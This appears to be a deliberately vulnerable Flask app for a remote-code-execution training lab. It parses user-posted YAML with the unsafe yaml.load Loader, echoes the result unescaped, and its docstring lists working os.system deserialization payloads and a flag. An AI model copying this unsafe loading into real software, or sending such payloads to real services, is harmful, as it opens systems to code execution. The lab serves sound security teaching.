"""
RCE Lab 7: YAML Deserialization RCE
Difficulty: 3 (Advanced)
Points: 100

Description:
Remote Code Execution through unsafe YAML deserialization.
"""

from flask import Flask, request
import yaml

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    """
    VULNERABLE: yaml.load() with default Loader
    
    Attack Vector:
    POST yaml=
    !!python/object/apply:os.system
    args: ['id']
    
    Or use full exploit:
    !!python/object/new:os.system ["id"]
    
    Flag: FLAG{rce_yaml_007}
    """
    result = None
    
    if request.method == 'POST':
        try:
            data = request.form.get('yaml', '')
            
            # VULNERABLE: yaml.load() allows arbitrary code execution
            obj = yaml.load(data, Loader=yaml.Loader)
            result = f"Loaded: {obj}"
        except Exception as e:
            result = f"Error: {str(e)}"
    
    return f"""
    <html>
    <body>
        <h1>YAML Parser</h1>
        <form method="POST">
            <textarea name="yaml" placeholder="YAML content"></textarea>
            <button>Parse</button>
        </form>
        {f"<p>{result}</p>" if result else ""}
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5007, debug=False)
